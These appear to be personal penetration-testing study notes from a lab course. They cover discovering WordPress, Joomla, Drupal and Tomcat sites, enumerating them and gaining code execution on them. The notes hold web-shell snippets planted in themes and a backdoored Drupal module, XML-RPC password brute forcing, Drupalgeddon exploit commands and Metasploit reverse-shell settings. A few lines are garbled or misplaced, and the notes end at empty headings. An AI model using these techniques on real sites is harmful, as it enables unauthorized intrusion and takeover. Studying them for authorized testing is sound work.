

### Getting Organized

we must stay organized through the entire pentesting process, thats why we will create a fixed [template](./External%20Penetration%20Test%20-%20%3CClient%20Name%3E.md) to use in `Enumeration & Discovery` section to refer to every time we enumerate



## CMS

#### WordPress

###### Discovery

how to discover the use of wordpress? 

1. browse to `robots.txt` , on wordpress installation it will look like : 
   
   ```http
   User-agent: *
   Disallow: /wp-admin/
   Allow: /wp-admin/admin-ajax.php
   Disallow: /wp-content/uploads/wpforms/
   
   Sitemap: https://inlanefreight.local/wp-sitemap.xml
   ```
   
   Here the presence of the `/wp-admin` and `/wp-content` directories confirm that its  WordPress

2. looking at the page source: 
   
   ```shellsession
   $ curl -s http://blog.inlanefreight.local | grep WordPress
   
   <meta name="generator" content="WordPress 5.8" /
   ```

###### Enumeration

after the discovery of usage of wordpress, its time for **enumeration**. browsing the site and identifying the themes and plugins installed for example: 

```shellsession
$ curl -s http://blog.inlanefreight.local/ | grep themes

<link rel='stylesheet' id='bootstrap-css'  href='http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/bootstrap/css/bootstrap.min.css' type='text/css' media='all' />
```

 and: 

```shellsession
$ curl -s http://blog.inlanefreight.local/ | grep plugins

<link rel='stylesheet' id='contact-form-7-css'  href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' />
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.8' id='subscriber-js-js'></script>
```

From the output, we know that the **Contact Form 7** and **mail-masta** plugins are installed. The next step would be enumerating the versions. by browsing to `http://blog.inlanefreight.local/wp-content/plugins/mail-masta` we will **find the version in the readme.txt file** , and then we can search for a CVE related 

> REMARK: to enumerate themes and plugins , visit every endpoint and every page in the app, different pages can load different themes and plugins

##### Enumerating Users

the default WordPress login page is found at `/wl-login.php` there, since there are different error messages (**username does not exist** and **wrong password** ) we can enumerate the usernames and after that the password

###### Login brute forcing

one of the methods to gain RCE is to have admin access to WordPress

it can be done by two methods:

1. clasical login bruteforcing using the default WordPress login form(/wl-login.php)

2. xmlrpc method (faster)
   
   this mehtod uses WordPress API to make login attempts through `/xmlrpc.php`  
   
   ```shellsession
   $ sudo wpscan --password-attack xmlrpc -t 20 -U user -P passwords
   ```

###### Code execution

after gaining admin access to WordPress.  we can modify the PHP source code to execute system commands, using the `appearance` section to modify the php source code directly of an inactive theme( to avoid corrupting the primary theme).

I can just add `system($_GET[0]);` to **its php file**(for example 404.php) and then save it and visit it in `/wp-content/themes/<theme name>/404.php` and voilà I gained a RCE via get parameter  (and ofc we can then utilize this access to gain an interactive reverse shell)

#### Joomla

###### Discovery

1. browse to `robots.txt` , if the web app is running on Joomla it will look like that:
   
   ```http
   # If the Joomla site is installed within a folder
   # eg www.example.com/joomla/ then the robots.txt file
   # MUST be moved to the site root
   # eg www.example.com/robots.txt
   # AND the joomla folder name MUST be prefixed to all of the
   # paths.
   # eg the Disallow rule for the /administrator/ folder MUST
   # be changed to read
   # Disallow: /joomla/administrator/
   #
   # For more information about the robots.txt standard, see:
   # https://www.robotstxt.org/orig.html
   
   User-agent: *
   Disallow: /administrator/
   Disallow: /bin/
   Disallow: /cache/
   Disallow: /cli/
   Disallow: /components/
   Disallow: /includes/
   Disallow: /installation/
   Disallow: /language/
   Disallow: /layouts/
   Disallow: /libraries/
   Disallow: /logs/
   Disallow: /modules/
   Disallow: /plugins/
   Disallow: /tmp/
   ```

2. looking at the page source:
   
   ```shellsession
   $ curl -s http://dev.inlanefreight.local/ | grep Joomla
   
       <meta name="generator" content="Joomla! - Open Source Content Management" />
   ```

if we're certain Joomla is installed, we can find the version from JavaScript files by browsing to  `administrator/manifests/files/joomla.xml` or `plugins/cache/cache.xml`

###### enumeration

after discovery, we can enumerate the website using tools like `Droopescan, Joomlascan`  to identify the version and search for exploits using `exploit-db` 

#### Drupal

###### Discovery 

A Drupal website can be identified in several ways: 

1. the header or footer message `Powered by Drupal`
2. the presence of a `CHANGELOG.txt` file or `README.txt` file via the page source
3. clues in the robots.txt file such as references to `/node`
4.  run `$ curl -s http://drupal.inlanefreight.local | grep Drupal`

###### Enumeration 

we aim to uncover the version, installed plugins.. 

1. using the CHANGELOG.TXT file
```
$ curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21
```

> Trying this against the latest Drupadcfdd5e021a869fcc6dfaef8bf31377el version we get a 404 response, because newer installs of Drupal by default block access to the `CHANGELOG.txt` and `README.txt` files

2. using `Droopscan`
```
$ droopescan scan drupal -u http://example.com
```

###### Leveragin the PHP filter module 

1. before version 8, we could log in as admin (maybe bruteforcing) and enable the `PHP filter` module. Next, we could go to Content --> Add content and create a `Basic page` with `system($_GET['cmd']);` PHP snippet and then we visit `$ curl -s http://drupal-qa.inlanefreight.local/node/3?cmd=id` 
 
2. from version 8 onwards,the [PHP Filter](https://www.drupal.org/project/php/releases/8.x-1.1) module is not installed by default, thats why we must download it ourselves(from the previous link) and go to `Administration` > `Reports` > `Available updates`and select the file we downloaded, and then click `Install`. Once the module is installed, we redo the step 1.

###### Uploading a Backdoored Module

Drupal allows users to upload new modules, what we will do is upload our vulnerable module with .php file to gain RCE
1. Let's pick a module such as [CAPTCHA](https://www.drupal.org/project/captcha) and download the tar.gz file extract its contents ```

```
$ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
$ tar xvf captcha-8.x-1.2.tar.gz
```
2. create `shell.php` file containing :`<?php system($_GET['cmd']); ?>`
3. create `.htaccess` file to give ourselves access to the folder because Drupal denies direct access to the `/modules` folder
```
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
4. Copy both of these files to the captcha folder and create an archive.
```
$ mv shell.php .htaccess captcha
$ tar cvf captcha.tar.gz captcha/
```
5.  assuming we have admin access, we go `Manage` (sidebar)> `Extend`  > `+ Install new module` > `Install` and then we browse to our web shell file and voila 
```
$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

###### Drupalgeddon

this flaw can be exploited by leveraging a pre-authentication SQL injection which can be used to upload malicious code to add an admin user. Let's try adding a new admin user with this [PoC](file:///home/kira/Desktop/htb/drupalgeddon.py) script
```
$ python3 drupalgeddon.py -t http://example.com -u user -p passwd
```

###### Drupalgeddon2

is a remote code execution vulnerability. The vulnerability occurs due to insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected. We can use this [PoC]([https://www.exploit-db.com/exploits/44448](file:///home/kira/Desktop/htb/drupalgeddon2.py))  to gain this vulnerability and then visit 
```
$ curl http://example.com/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

Drupalgeddon3

This is an authenticated remote code execution vulnerability. It requires a user to have the ability to delete a node. We can exploit this using Metasploit, but we must first log in and obtain a valid session cookie.

1. login into Drupal and retrieves session cookie 
2. in metasploit (`mfconsole`) :
```
> set rhosts [current target IP]
> set VHOST [current targeted Drupal website]
> set drupal_session [session cookie]
> set DRUPAL_NODE 1(an existing node that my account has permission to delete)
> set LHOST [VPN interface]
> set LPORT [port receiving the reverse connection]
> show options 
> exploit
```
if successful, you will receive a `meterpreter >` prompt.


#### Tomcat

###### Discovery 

**(we can see the general folder structure of a Tomcat installation in [this page](https://academy.hackthebox.com/app/module/113/section/1090) maybe it helps)**
1. requesting an invalid page should reveal the server and version.
2. visiting `/docs` : `curl -s http://example.com/docs/ | grep Tomcat`
###### Enumeration

we typically want to look for `/manager` and `host-manager` pages, for this goal we can use gobuster(or browse directly to them) and then login to one of these using weak creds like `tomcat:tomcat` or `admin:admin` or bruteforcing the creds 

###### Login Brute Force













## Tools

##### Nmap

syntax: 

```shellsession
$ nmap <scan types> <options> <target>
```

##### WPScan

WPScan is an automated WordPress scanner and enumeration tool 

syntax : 

```shellsession
$ wpscan --url http://target --enumerate 
```

this only tells : the wordpress verion , plugins  , users ...

when specifying an API token from WPNVlunDB, WPScan will ask for any known vulnerabilities related to the results found for example : 

```
Plugin: contact-form-7
Version: 5.6

Known Vulnerabilities:
- CVE-2023-12345
- CVE-2023-67890
```

Login brute forcing 

```shellsession
$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http:/target
```

the `-t` flag specifies the number of threads

the  `-U` flag sets the username ( or list of usernames)

the `-P` sets the password (here list of passwords)

##### EyeWitness

takes the XML output from both Nmap and Nessus and create a report with screenshots of each web application present on the various ports and categorize the applications where possible, fingerprint them, and suggest default credentials based on the application
run `$ eyewitness -h` to see how to use it 

##### Aquatone

Similar to EyeWitness and can take screenshots when provided a `.txt` file of hosts or an Nmap `.xml` file with the `-nmap` flag
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
Syntax:

```
$ cat web_discovery.xml | ./aquatone -nmap
```


##### Droopescan

a scanner designed to identify and expose infos and vulnerabilities in websites that uses a CMS

Syntax:

```
$ droopescan scan [cms name] -u https://example.com
```


#### Joomlascan

scanner specifically for Joomla CMS websites

Syntax:

``` shellsession 
$ python2 joomlascan.py -u http://example.com
```





#### Searchsploit
